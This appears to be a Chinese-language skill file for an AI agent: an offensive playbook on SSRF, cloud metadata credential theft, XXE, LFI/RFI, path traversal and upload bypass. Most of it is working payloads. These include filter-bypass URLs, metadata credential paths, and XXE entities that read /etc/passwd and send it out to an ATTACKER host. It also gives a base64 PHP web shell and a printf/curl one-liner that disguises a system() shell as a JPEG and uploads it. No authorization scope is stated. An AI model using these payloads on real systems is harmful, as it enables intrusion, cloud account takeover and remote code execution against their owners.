---
name: ssrf-and-server-side-chains
description: 服务端请求伪造与文件链（SSRF→云 metadata 凭证接管、XXE 带外、LFI/RFI、路径穿越、文件上传绕过）。当意图涉及"让服务器帮我发请求""读文件""上传 shell""打内网"时读本 skill。
---
# SSRF / XXE / 文件链 Playbook

## 1. SSRF 判定（先定性，再谈打穿）

**第一步：找到"服务器发出请求"的入口**
```
URL 参数:      ?url= ?u= ?image= ?webhook= ?callback= ?feed= ?proxy= ?target= ?next=
功能入口:      图片/头像远程拉取、URL 预览、PDF/截图生成、导入 RSS、Webhook 测试、
             在线翻译、链接短化、邮件里发链接、Web 编辑器粘贴图片
隐藏位置:      Referer/Origin 被后端二次请求、X-Forwarded-Host、文件参数传 http://
```

**第二步：分层验证（不要一上来就打 metadata）**
```bash
# ① 回显型：能否直接看到响应
?url=http://ATTACKER/            # 起 kx nc -lvnp 8000 看有没有回来

# ② 盲型：只能观察差异 → 用 DNS 带外最稳
?url=http://probe.ATTACKER/      # dig 记录
?url=http://169.254.169.254/     # 时间差/状态码差异

# ③ 半盲：返回长度/状态码/错误信息
?url=http://127.0.0.1:8080/      # 对比 404 与 200 的长度
```

**第三步：过滤器绕过矩阵（按顺序试）**
```
http://127.0.0.1        → http://127.1  http://0  http://[::1]  http://0x7f000001
                        → http://2130706433  http://0177.0.0.1  http://127.0.0.1.nip.io
白名单域名绕过           → http://allowed.com@attacker.com   http://attacker.com#@allowed.com
                        → http://allowed.com.attacker.com    http://attacker.com/allowed.com
协议                     → file:// gopher:// dict:// ftp:// ldap:// unix:
重定向绕（关键）         → 自己的服务器 302 到 169.254.169.254（多数校验只做第一次）
DNS 重绑定               → 让自己的域名第一次解析到白名单 IP，第二次解析到 127.0.0.1
```

## 2. 云 metadata 凭证接管（最高价值）

SSRF 一旦打通到 `169.254.169.254`，按云厂逐个试：

| 云 | 路径 | 备注 |
|---|---|---|
| AWS | `/latest/meta-data/iam/security-credentials/` | 需先拿角色名再取第二个路径 |
| AWS v2 | `PUT /latest/api/token` 拿 token 再带 `X-aws-ec2-metadata-token` | v1 关闭时只有这个 |
| 阿里云 | `/latest/meta-data/ram/security-credentials/` | |
| 腾讯云 | `/latest/meta-data/cam/security-credentials/` | |
| 华为云 | `/openstack/latest/meta_data.json` | |
| GCP | `Metadata-Flavor: Google` + `/computeMetadata/v1/instance/service-accounts/default/token` | 必须加头 |
| Azure | `Metadata: true` + `/metadata/identity/oauth2/token?resource=...` | 必须加头 |
| K8s | `/var/run/secrets/kubernetes.io/serviceaccount/token`（需 file 协议） | |

拿到凭证后立刻验证能否用（**这就是从 SSRF 升级到接管的关键一步**）：
```bash
# AWS
aws configure set aws_access_key_id AKIA...; aws sts get-caller-identity
# 阿里云/腾讯云 → 用对应 CLI 或直接调 OpenAPI 签名请求
```
> 提示：容器内没装 aws cli 时，直接用 curl 调 STS `GetCallerIdentity`（SigV4 签名可手搓或用 python 脚本）。

## 3. XXE

```bash
# 经典文件读取
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>

# PHP 伪协议读源码
<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">

# 盲 XXE → 带外（最常用，因为响应往往不回显）
<!DOCTYPE r [<!ENTITY % f SYSTEM "http://ATTACKER/e.dtd"> %f;]>
# e.dtd 内容：
#   <!ENTITY % p SYSTEM "file:///etc/passwd">
#   <!ENTITY % send "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?d=%p;'>">

# 报错型（无出网时）
<!ENTITY % p SYSTEM "file:///nonexistent/%file;">
```
**送达点**：任何收 XML 的地方——SOAP、SVG 上传、DOCX/XLSX（解压后改 `document.xml`）、RSS、SAML、AndroidManifest、`Content-Type: application/xml` 的接口，以及**把 JSON 换成 XML** 试试（很多框架双解析）。

## 4. LFI / RFI / 路径穿越

```
../../../../etc/passwd
....//....//....//etc/passwd            # 过滤 ../ 时
..%2f..%2f..%2fetc%2fpasswd             # URL 编码
%252e%252e%252f                          # 双编码
/etc/passwd%00.png                       # 旧版截断
php://filter/convert.base64-encode/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
expect://id
/proc/self/environ   /proc/self/cmdline   /proc/self/fd/N
```

**高价值目标**（读到就等于拿权限）：`.env`、`config.php`、`wp-config.php`、`settings.py`、`.git/config`、`id_rsa`、`/var/log/auth.log`（可注入日志 → LFI 转 RCE）、session 文件、`/proc/self/environ`。

**LFI→RCE 的四条路**：日志投毒（UA 里写 PHP）、session 投毒、`/proc/self/environ` 注入、上传临时文件 + 竞争包含。

## 5. 文件上传绕过

**判定顺序**：能不能传 → 传上去能不能访问 → 访问后能不能执行。

| 防线 | 绕过 |
|---|---|
| 前端 JS 校验 | 直接发请求（curl / Burp） |
| Content-Type 校验 | 改 `Content-Type: image/png` |
| 后缀黑名单 | `.phtml .php3 .php5 .pht .phar .inc`；`.php.` `.php%00.jpg` `.php::$DATA`；大小写 `.PHP` |
| 后缀白名单 | 双后缀 `shell.jpg.php`、截断、`.htaccess` 上传改写解析规则 |
| 魔数校验 | 文件头补 `GIF89a` / `\xFF\xD8\xFF`，后面接 PHP 代码 |
| 内容二次渲染 | 用图片马 + 配合 LFI；或找「改文件名/改 EXIF」接口写入恶意串 |
| 存储与执行分离 | 传到对象存储不算洞；找到能引用它的解析器（PDF 生成/缩略图/导入）才算 |
| 路径不可知 | 响应/报错里找路径；用 `insert_assets` 记录上传后的 URL |

```bash
# 快速把 shell 伪装成图片
printf '\xFF\xD8\xFF\xE0' > s.php; echo '<?php system($_GET["c"]);?>' >> s.php
curl -F "file=@s.php;type=image/jpeg" http://TARGET/upload
```

## 6. 判定与写回

- **SSRF 成立**：证明"服务器替我发出了请求"（带外命中最硬），而不是"我怀疑它能"。
- **升级链要分步记**：SSRF 打点 → metadata 取凭证 → 凭证可用，每一步一条 fact，最后一条 finding 串成链。
- 只拿到本机 127.0.0.1 的 404 页面，写 inferred，别写成"内网可达"。
